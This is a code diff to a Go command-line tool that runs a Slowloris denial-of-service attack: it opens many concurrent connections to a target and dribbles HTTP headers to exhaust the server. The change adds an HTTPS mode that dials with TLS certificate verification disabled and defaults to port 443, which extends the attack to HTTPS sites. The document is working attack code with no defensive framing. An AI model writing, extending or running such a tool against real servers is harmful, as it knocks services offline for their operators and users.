@@ -1,6 +1,7 @@
 package main
 
 import (
+	"crypto/tls"
 	"flag"
 	"fmt"
 	"net"
@@ -23,6 +24,7 @@ var (
 	resource       string
 	userAgent      string
 	target         string
+	https          bool
 )
 
 func main() {
@@ -37,10 +39,14 @@ func main() {
 
 	target = flag.Args()[0]
 	if !strings.Contains(target, ":") {
-		target += ":80"
+		if https {
+			target += ":443"
+		} else {
+			target += ":80"
+		}
 	}
 
-	openConnections(target, numConnections, timeout)
+	openConnections(target, numConnections, timeout, https)
 
 loop:
 	for {
@@ -59,6 +65,7 @@ func parseParams() {
 	flag.StringVar(&method, "method", "GET", "HTTP method to user")
 	flag.StringVar(&resource, "resource", "/", "Resource to request from the server")
 	flag.StringVar(&userAgent, "useragent", defaultUserAgent, "User-Agent header of the request")
+	flag.BoolVar(&https, "https", false, "Use HTTPS")
 	flag.Parse()
 }
 
@@ -72,27 +79,40 @@ func usage() {
 	fmt.Println("")
 }
 
-func openConnections(target string, num, timeout int) {
+func openConnections(target string, num, timeout int, https bool) {
 	for i := 0; i < num; i++ {
-		go slowloris(target, interval, timeout)
+		go slowloris(target, interval, timeout, https)
 	}
 }
 
-func slowloris(target string, interval, timeout int) {
+func slowloris(target string, interval, timeout int, https bool) {
 	timeoutDuration := time.Duration(timeout) * time.Second
 
 loop:
 	for {
-		conn, err := net.DialTimeout("tcp", target, timeoutDuration)
-		if err != nil {
-			continue
+		var conn net.Conn
+		var err error
+
+		if https {
+			config := &tls.Config{InsecureSkipVerify: true}
+			conn, err = tls.Dial("tcp", target, config)
+			if err != nil {
+				continue
+			}
+			defer conn.Close()
+		} else {
+			conn, err = net.DialTimeout("tcp", target, timeoutDuration)
+			if err != nil {
+				continue
+			}
+			defer conn.Close()
 		}
-		defer conn.Close()
 
 		host := target
 		headers := makeHeaders(host)
 		req, err := createRequest(host, method, resource, headers)
 		if err != nil {
+			fmt.Println(err.Error())
 			continue
 		}
 		req.Header.Write(conn)
